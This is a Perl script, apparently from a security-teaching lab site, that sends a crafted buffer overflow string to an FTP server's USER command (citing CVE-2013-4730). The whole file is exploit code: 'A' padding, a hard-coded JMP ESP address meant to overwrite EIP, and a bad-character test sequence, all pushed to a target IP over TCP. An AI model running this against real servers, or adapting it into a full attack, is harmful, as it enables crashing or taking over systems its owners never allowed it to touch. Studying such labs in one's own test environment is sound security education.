#!/usr/bin/perl

# - As a condition of your use of this Web site and Code, you warrant to computersecuritystudent.com
#   that you will not use this Web site or Code for any purpose that is unlawful or that is
#   prohibited by these terms, conditions, and notices.
# - In accordance with UCC § 2-316, this product is provided with "no warranties, either express or
#   implied." The information contained is provided "as-is", with "no guarantee of merchantability."
# - In addition, this is a teaching website that does not condone malicious behavior of any kind.
# - You are on notice, that continuing and/or using this lab and code outside your "own" test
#   environment is considered malicious and is against the law.
# - © 2016 No content replication of any kind is allowed without express written permission.
# - Authors: @bobmitch2311 and @HKD_student

# Creates an IO::Socket::INET object interface
use IO::Socket;

chomp($IPADDRESS        = $ARGV[0]);
chomp($PORT             = $ARGV[1]);
chomp($COUNT		= $ARGV[2]);

if(($IPADDRESS eq "")||($PORT eq "")||($COUNT eq ""))
{
        print "Help Usage\n";
        print "------------------------------------------------\n";
        print "$0 <IPADDRESS> <PORT> <FUZZER_COUNT>\n";
        print "------------------------------------------------\n";
        print "E.g., $0 192.168.2.106 21 3000\n";
        exit;
}

# FTP Links
# https://www.ietf.org/rfc/rfc959.txt
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730
# Per CVE-2013-4730 and RFC will fuzz the USER variable that does
# need to contain a <space> after the string (USER)
# E.g., (USER )
$header 	= "USER ";

# Create a string of many A's
# The Hexidecimal for A is (x41)
# E.g., 2001 AAAAAA....AAAA's
# This is the OFFSET we were provided from pattern_create.rb
# E.g., /usr/share/metasploit-framework/tools/pattern_create.rb 2007

$junk 		= "\x41" x $COUNT;

# 1) The EIP is a special register that points to the instruction 
#    that will be executed next.
# 2) If we can write 4 B's into this special register, then we can 
#    potential control what happens next

# JMP ESP
# Replace the 4 BBBB's with the JMP ESP Register
# Bit and Byte Order x86 is little-endian. In illustrations of data structures 
# in memory, smaller addresses appear toward the bottom of the figure; addresses 
# increase toward the top. Bit positions are numbered from right to left. The numerical 
# value of a set bit is equal to two raised to the power of the bit position. 
# IA-32 processors are “little endian” machines; this means the bytes of a word are 
# numbered starting from the least significant byte

$eip    	= "\xD7\x30\x9D\x7C";

# This is a list of the complete Hexidecimal sequent from 00 to FF
# http://www.edsim51.com/8051Notes/hex.html
# Known Bad Characters
# x00 - null byte (removed)
# x0A - carriage return (removed)
# x0D - new line (removed)

$allhexchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";

# Create a fuzzing string that looks like
# x00 is removed
# USER AAAA($COUNT)AAAA|EIP(D7309D7C)|HEX CHAR TEST(x01..x09x0Bx0C..xFF)

$string 	= $header.$junk.$eip.$allhexchars;

# Create A Socket to an IPADDRESS over a PORT using the TCP Protocol
$socket = IO::Socket::INET->new(PeerAddr => "$IPADDRESS",PeerPort => "$PORT",Proto => "tcp");

# Send the fuzzing string of
# E.g., USER AAAA($COUNT)AAAA|EIP(D7309D7C)|HEX CHAR TEST(x01..x09x0Bx0C..xFF
print $socket $string;
print "===> [Sending USER AAAA($COUNT)AAAA|EIP(D7309D7C)|HEX CHAR TEST(x01..x09x0Bx0C..xFF)]\n";

# Close Socket
close($socket);

